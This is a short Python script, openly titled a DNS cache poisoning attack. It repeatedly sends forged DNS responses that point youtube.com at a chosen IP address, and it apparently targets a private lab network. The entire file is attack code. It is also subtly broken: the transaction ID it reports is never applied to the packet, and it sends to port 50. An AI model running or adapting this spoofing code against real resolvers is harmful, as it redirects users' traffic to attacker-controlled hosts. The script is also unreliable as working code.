import socket
import time
from dnslib import DNSRecord, RR, A

DNS_SERVER = "172.22.9.117"
PORT = 50

TARGET_DOMAIN = "youtube.com."
FAKE_IP = "172.22.9.117"
TX_ID = 50000

def send_fake_response():
    fake_query = DNSRecord.question(TARGET_DOMAIN)
    fake_response = fake_query.reply()
    fake_response.add_answer(RR(TARGET_DOMAIN, ttl=300, rdata=A(FAKE_IP)))

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(fake_response.pack(), (DNS_SERVER, PORT))  # Send poisoned packet
        print(f"🚨 Sent spoofed response: {TARGET_DOMAIN} -> {FAKE_IP} (TX ID {TX_ID})")

def attack():
    while True:
        send_fake_response()
        time.sleep(0.01)

if __name__ == "__main__":
    print("🚀 Starting DNS Cache Poisoning Attack 🚀")
    attack()

